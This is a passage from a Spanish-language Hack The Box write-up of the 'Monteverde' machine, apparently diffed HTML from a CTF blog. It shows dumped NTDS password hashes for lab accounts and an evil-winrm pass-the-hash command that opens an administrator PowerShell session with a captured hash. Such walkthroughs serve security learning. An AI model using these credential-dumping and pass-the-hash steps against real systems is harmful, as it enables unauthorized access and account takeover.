+SMB         10.129.228.111  445    MONTEVERDE       MEGABANK.LOCAL<span class="se">\s</span>morgan:2615:aad3b435b51404eeaad3b435b51404ee:3a2b291c4291a1063a4b32e1770e5388:::
+SMB         10.129.228.111  445    MONTEVERDE       MONTEVERDE<span class="nv">$:</span>1000:aad3b435b51404eeaad3b435b51404ee:2e06005800e9c8981d41f5c109ca4c03:::
+SMB         10.129.228.111  445    MONTEVERDE       <span class="o">[</span>+] Dumped 13 NTDS hashes to /home/miguel/.cme/logs/MONTEVERDE_10.129.228.111_2024-03-31_143351.ntds of which 12 were added to the database
+</code></pre></div></div>
+
+<ul>
+  <li>También nos podemos conectar con el hash.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content evil-winrm <span class="nt">-i</span> 10.129.228.111 <span class="nt">-u</span> administrator <span class="nt">-H</span> 100a42db8caea588a626d3a9378cd7ea
+
+Evil-WinRM shell v3.5
+
+Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc<span class="o">()</span> <span class="k">function </span>is unimplemented on this machine
+
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+
+Info: Establishing connection to remote endpoint
+<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>ocuments&gt;
+</code></pre></div></div>
+
+  </div><a class="u-url" href="/hackthebox/machines/medium/2024/04/10/monterverde.html" hidden></a>
+</article>
+
+      </div>
+    </main><footer class="site-footer h-card">
+  <data class="u-url" href="/"></data>
+
+  <div class="wrapper">
+
+    <div class="footer-col-wrapper">
+      <div class="footer-col">
+        <p class="feed-subscribe">
+          <a href="http://localhost:4000/feed.xml">
+            <svg class="svg-icon orange">
+              <use xlink:href="/assets/minima-social-icons.svg#rss"></use>
+            </svg><span>Subscribe</span>
+          </a>
+        </p>
+        <ul class="contact-list">
+          <li class="p-name">MiguelRega7</li>
+          
+        </ul>
+      </div>
+      <div class="footer-col">
+        <p>Posts sobre resolucion de CTFs y ciberseguridad.
+</p>
+      </div>
+    </div>
+
+    <div class="social-links"><ul class="social-media-list"></ul>
+</div>
+
+  </div>
+
+</footer>
+</body>
+
+</html>
